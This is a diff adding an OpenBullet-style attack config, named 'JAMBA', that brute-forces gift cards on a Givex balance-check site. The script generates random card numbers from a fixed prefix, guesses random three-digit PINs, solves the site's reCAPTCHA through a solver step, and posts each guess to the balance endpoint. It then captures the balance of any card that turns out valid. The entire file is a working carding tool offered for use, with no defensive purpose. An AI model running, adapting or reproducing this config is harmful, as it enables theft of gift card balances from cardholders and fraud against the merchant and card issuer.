@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "JAMBA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-29T16:58:53.6519085-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "150210169?d?d?d?d?d" -> CAP "NUM" 
+
+FUNCTION RandomString "?d?d?d" -> VAR "PIN" 
+
+REQUEST GET "https://wwws-usa2.givex.com/public/balance/balancecheck_new.py?_LANGUAGE_:en+19889" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "o_id\" VALUE=\"" "\"" -> VAR "ID" 
+
+RECAPTCHA "https://wwws-usa2.givex.com/merchant_balcheck/19889_en/" "6LdUCxYTAAAAANMjMuPFMrC1GyTHmem5M1llJ8Id" -> VAR "CAPTCHA" 
+
+REQUEST POST "https://wwws-usa2.givex.com/public/balance/balancecheck_new.py?19889+_LANGUAGE_:en" 
+  CONTENT "cardnum=<NUM>&_LANGUAGE_=en&_FUNCTION_=result&webinfo_id=<ID>&merchant_id=19889&partner_id=1&security=<PIN>&g-recaptcha-response=<CAPTCHA>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "class=\"balance\">" 
+  KEYCHAIN Failure OR 
+    KEY "Card number is invalid" 
+
+PARSE "<SOURCE>" LR "class=\"balance\">" "</p>" CreateEmpty=FALSE -> CAP "BALANCE" 
+
